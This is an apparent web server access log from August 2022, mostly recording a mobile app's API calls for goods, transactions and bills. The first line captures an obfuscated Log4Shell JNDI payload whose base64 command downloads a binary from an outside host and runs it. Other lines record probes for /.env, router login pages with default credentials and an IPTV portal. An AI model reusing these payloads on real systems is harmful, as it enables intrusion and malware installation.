::1 - - [31/Aug/2022:00:06:23 +0000] "GET / HTTP/1.0" 404 139 "t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//168.138.128.171:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTY4LjEzOC4xMjguMTcxL3Jpb3Qvb3BlbnZwbjsgY3VybCAtTyBodHRwOi8vMTY4LjEzOC4xMjguMTcxL3Jpb3Qvb3BlbnZwbjsgY2htb2QgNzc3IG9wZW52cG47IC4vb3BlbnZwbiBydW5uZXI=}')" "t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//168.138.128.171:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTY4LjEzOC4xMjguMTcxL3Jpb3Qvb3BlbnZwbjsgY3VybCAtTyBodHRwOi8vMTY4LjEzOC4xMjguMTcxL3Jpb3Qvb3BlbnZwbjsgY2htb2QgNzc3IG9wZW52cG47IC4vb3BlbnZwbiBydW5uZXI=}')"
::ffff:127.0.0.1 - - [31/Aug/2022:00:09:37 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::1 - - [31/Aug/2022:00:09:37 +0000] "POST /HNAP1/ HTTP/1.0" 404 146 "-" "Mozila/5.0"
::ffff:127.0.0.1 - - [31/Aug/2022:00:25:08 +0000] "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0" 404 162 "-" "-"
::1 - - [31/Aug/2022:00:43:45 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:01:02:44 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [31/Aug/2022:01:02:44 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:01:10:41 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:10:41 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:10:41 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:10:43 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:10:49 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:10:53 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:10:55 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:10:55 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:10:56 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:10:56 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:10:56 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:10:58 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:10:58 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:10:58 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:12:27 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:12:27 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:12:30 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:12:32 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:12:33 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:12:33 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:12:36 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:12:37 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:12:37 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:12:39 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:12:39 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:12:39 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:12:41 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:12:41 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:12:43 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:12:46 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:12:46 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:12:46 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:12:51 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:12:51 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:12:51 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:12:52 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:12:54 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:12:55 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:12:56 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:12:56 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:12:59 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:12:59 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:13:46 +0000] "GET /api/v1/users/logout HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:14:02 +0000] "POST /api/v1/users/login HTTP/1.0" 401 123 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:14:13 +0000] "POST /api/v1/users/login HTTP/1.0" 401 123 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:14:39 +0000] "POST /api/v1/users/login HTTP/1.0" 401 123 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:14:47 +0000] "POST /api/v1/users/login HTTP/1.0" 200 557 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:14:47 +0000] "GET /api/v1/users/62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:15:02 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:15:13 +0000] "GET /api/v1/transactions/user?template=62f8ab1e8e470b4b6899bf03 HTTP/1.0" 200 534 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:15:13 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:16:11 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:16:12 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:16:12 +0000] "GET /api/v1/transactions/user?template=62f8a8f78e470b4b6899bde0 HTTP/1.0" 200 1200 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:16:14 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:16:16 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:16:16 +0000] "GET /api/v1/transactions/user?template=62f8a8f78e470b4b6899bde0 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:17:02 +0000] "POST /api/v1/bills/drain HTTP/1.0" 200 411 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:18:23 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:18:26 +0000] "GET /api/v1/transactions/user?template=62f8a91b8e470b4b6899be0a HTTP/1.0" 200 531 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:18:26 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:18:35 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:19:03 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:19:05 +0000] "GET /api/v1/bills/debt?type=%D0%97%D0%B0%D1%80%D0%BB%D0%B0%D0%B3%D0%B0 HTTP/1.0" 200 628 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:19:16 +0000] "GET /api/v1/bills/630eb68ef66eb6d6a8720322 HTTP/1.0" 200 435 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:19:58 +0000] "POST /api/v1/bills/debt/630eb68ef66eb6d6a8720322 HTTP/1.0" 200 508 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:20:25 +0000] "GET /api/v1/bills/debt?type=%D0%9E%D1%80%D0%BB%D0%BE%D0%B3%D0%BE HTTP/1.0" 200 134 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:20:35 +0000] "GET /api/v1/bills/debt?type=%D0%97%D0%B0%D1%80%D0%BB%D0%B0%D0%B3%D0%B0 HTTP/1.0" 200 718 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:20:37 +0000] "GET /api/v1/bills/630eb68ef66eb6d6a8720322 HTTP/1.0" 200 529 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:21:03 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:21:03 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:21:03 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 3407 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:21:10 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:21:10 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:21:10 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:21:13 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:21:15 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:21:17 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:21:20 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:21:22 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:21:24 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:21:24 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:21:26 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:21:26 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:21:28 +0000] "GET /api/v1/bills/debt?type=%D0%9E%D1%80%D0%BB%D0%BE%D0%B3%D0%BE HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:21:40 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt&type=%D0%97%D0%B0%D1%80%D0%BB%D0%B0%D0%B3%D0%B0 HTTP/1.0" 200 3542 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:21:44 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:21:44 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt&type=%D0%97%D0%B0%D1%80%D0%BB%D0%B0%D0%B3%D0%B0 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:21:44 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:22:03 +0000] "GET /upload/undefined HTTP/1.0" 404 155 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:22:03 +0000] "GET /api/v1/goods/630db873f66eb6d6a871fbb3 HTTP/1.0" 200 441 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:22:03 +0000] "GET /api/v1/transactions/user?good=630db873f66eb6d6a871fbb3&sort=-createdAt HTTP/1.0" 200 1872 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:22:03 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:22:03 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:22:04 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:22:04 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:22:06 +0000] "GET /upload/undefined HTTP/1.0" 404 155 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:22:06 +0000] "GET /api/v1/goods/630db873f66eb6d6a871fbb3 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:22:06 +0000] "GET /api/v1/transactions/user?good=630db873f66eb6d6a871fbb3&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:22:06 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:22:06 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:22:07 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:22:07 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:22:20 +0000] "POST /api/v1/transactions HTTP/1.0" 200 256 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:22:20 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 433 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:22:20 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 433 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:23:47 +0000] "POST /api/v1/bills/drain HTTP/1.0" 400 140 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:23:49 +0000] "POST /api/v1/bills/drain HTTP/1.0" 400 140 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:24:06 +0000] "POST /api/v1/bills/drain HTTP/1.0" 400 140 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:24:23 +0000] "POST /api/v1/bills/drain HTTP/1.0" 400 140 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:24:26 +0000] "POST /api/v1/bills/drain HTTP/1.0" 400 140 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:24:27 +0000] "POST /api/v1/bills/drain HTTP/1.0" 400 140 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:24:32 +0000] "POST /api/v1/bills/drain HTTP/1.0" 400 140 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:24:47 +0000] "POST /api/v1/bills/drain HTTP/1.0" 400 140 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:25:18 +0000] "POST /api/v1/transactions HTTP/1.0" 200 254 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:25:19 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 773 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:25:19 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 773 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:25:51 +0000] "POST /api/v1/bills/drain HTTP/1.0" 400 140 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:26:01 +0000] "DELETE /api/v1/transactions/630eb7ccf66eb6d6a872039b HTTP/1.0" 200 256 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:26:01 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 461 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:26:01 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 461 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:26:10 +0000] "POST /api/v1/bills/drain HTTP/1.0" 200 318 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:26:11 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:26:11 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:26:25 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:26:25 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 3407 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:26:25 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 3407 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:26:27 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt&type=%D0%97%D0%B0%D1%80%D0%BB%D0%B0%D0%B3%D0%B0 HTTP/1.0" 200 3837 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:26:27 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:26:30 +0000] "GET /api/v1/bills/debt?type=%D0%9E%D1%80%D0%BB%D0%BE%D0%B3%D0%BE HTTP/1.0" 200 134 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:26:36 +0000] "GET /api/v1/bills/debt?type=%D0%97%D0%B0%D1%80%D0%BB%D0%B0%D0%B3%D0%B0 HTTP/1.0" 200 718 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:26:38 +0000] "GET /api/v1/bills/630eb68ef66eb6d6a8720322 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:26:55 +0000] "GET /stalker_portal/server/tools/auth_simple.php HTTP/1.0" 404 182 "-" "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
::1 - - [31/Aug/2022:01:26:57 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:27:03 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:27:03 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:27:03 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:27:15 +0000] "POST /api/v1/transactions HTTP/1.0" 200 254 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:27:15 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 455 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:27:15 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 455 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:28:15 +0000] "POST /api/v1/bills/drain HTTP/1.0" 200 396 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:28:15 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:28:15 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:28:21 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:28:21 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 3407 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:28:28 +0000] "GET /api/v1/bills/debt?type=%D0%9E%D1%80%D0%BB%D0%BE%D0%B3%D0%BE HTTP/1.0" 200 134 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:28:34 +0000] "GET /api/v1/bills/debt?type=%D0%97%D0%B0%D1%80%D0%BB%D0%B0%D0%B3%D0%B0 HTTP/1.0" 200 1187 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:29:07 +0000] "GET /api/v1/bills/debt?type=%D0%9E%D1%80%D0%BB%D0%BE%D0%B3%D0%BE HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:29:19 +0000] "GET /api/v1/transactions/profit HTTP/1.0" 200 3813 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:29:25 +0000] "GET /api/v1/transactions/profit HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:29:32 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:29:32 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:29:59 +0000] "GET /upload/undefined HTTP/1.0" 404 155 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:29:59 +0000] "GET /api/v1/transactions/user?good=62f8afa68e470b4b6899bf5c&sort=-createdAt HTTP/1.0" 200 119 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:29:59 +0000] "GET /api/v1/goods/62f8afa68e470b4b6899bf5c HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:29:59 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:29:59 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:30:01 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:30:01 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:30:15 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
